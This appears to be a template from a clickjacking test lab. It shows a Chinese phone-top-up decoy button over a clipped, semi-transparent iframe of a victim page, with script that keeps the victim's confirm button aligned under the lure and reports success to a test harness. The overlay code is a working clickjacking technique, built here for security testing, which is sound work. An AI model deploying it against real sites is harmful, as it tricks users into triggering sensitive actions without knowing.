{% extends "attacker/base.html" %}
{% block title %}{{ scenario.seq }} {{ scenario.title }}{% endblock %}
{% block content %}
{% include "attacker/run/_run_header.html" %}

<div class="attack-stage" id="stage">
  <div class="decoy-card">
    <h2>手机话费快速充值</h2>
    <p>本月充值满 100 元返 20 元，10 分钟内到账。</p>
    <input class="decoy-phone" type="text" value="138****6688" readonly>
    <button type="button" class="decoy-button" id="decoy-button">{{ params.decoy_text }}</button>
  </div>
  <div class="clip-window {{ 'debug-outline' if params.debug else '' }}" id="clip-window">
    <iframe id="victim-frame"
            title="attack target"
            src="{{ params.victim_url() }}"
            style="opacity: {{ params.opacity }};"></iframe>
  </div>
</div>

<script>
  const RUN_ID = {{ run.run_id | tojson }};
  const REPORT_TOKEN = {{ report_token | tojson }};
  const PARAMS = {{ params.as_dict() | tojson }};
</script>
<script src="{{ url_for('static', filename='js/attack-report.js') }}"></script>
<script>
  (function () {
    "use strict";
    const stage = document.getElementById("stage");
    const frame = document.getElementById("victim-frame");
    const clipWindow = document.getElementById("clip-window");
    const decoy = document.getElementById("decoy-button");
    const statusLine = document.getElementById("run-status");

    function layout() {
      const stageRect = stage.getBoundingClientRect();
      const decoyRect = decoy.getBoundingClientRect();

      clipWindow.style.width = PARAMS.window_width + "px";
      clipWindow.style.height = PARAMS.window_height + "px";
      const cx = decoyRect.left + decoyRect.width / 2 - stageRect.left + PARAMS.offset_x;
      const cy = decoyRect.top + decoyRect.height / 2 - stageRect.top + PARAMS.offset_y;
      clipWindow.style.left = Math.round(cx - PARAMS.window_width / 2) + "px";
      clipWindow.style.top = Math.round(cy - PARAMS.window_height / 2) + "px";

      // The victim confirm button sits at the center of the victim page, so the
      // iframe center must coincide with the clip-window center.
      frame.style.width = PARAMS.iframe_width + "px";
      frame.style.height = PARAMS.iframe_height + "px";
      frame.style.left = Math.round(PARAMS.window_width / 2 - PARAMS.iframe_width / 2) + "px";
      frame.style.top = Math.round(PARAMS.window_height / 2 - PARAMS.iframe_height / 2) + "px";
    }

    let loadsForCurrentSrc = 0;
    let finished = false;

    frame.addEventListener("load", function () {
      loadsForCurrentSrc += 1;
      AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, {
        type: "iframe_load",
        sequence: loadsForCurrentSrc
      });
      if (loadsForCurrentSrc >= 2 && !finished) {
        finished = true;
        AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, {
          type: "victim_action_reload",
          sequence: loadsForCurrentSrc
        });
        AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, {
          type: "run_complete",
          outcome: "likely_success"
        });
        statusLine.textContent =
          "裁剪窗口内的目标按钮已完成提交：敏感操作很可能已被触发，请用 victim 测试 API 核实业务状态变化。";
      }
    });

    window.addEventListener("DOMContentLoaded", function () {
      layout();
      AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "page_ready" });
      statusLine.textContent = "裁剪窗口已对齐诱导按钮，仅露出目标确认按钮区域。";
    });
    window.addEventListener("resize", function () {
      layout();
    });

// 布局稳定前按钮位置可能变化（字体渲染/内容加载/滚动条出现），
// 在所有布局变化点重复对齐，幂等且开销极低。
window.addEventListener("load", layout);
window.addEventListener("scroll", layout, { passive: true });
if (document.fonts && document.fonts.ready) {
  document.fonts.ready.then(function () { layout(); });
}
[300, 800, 1500].forEach(function (ms) { setTimeout(layout, ms); });
  })();
</script>
{% endblock %}
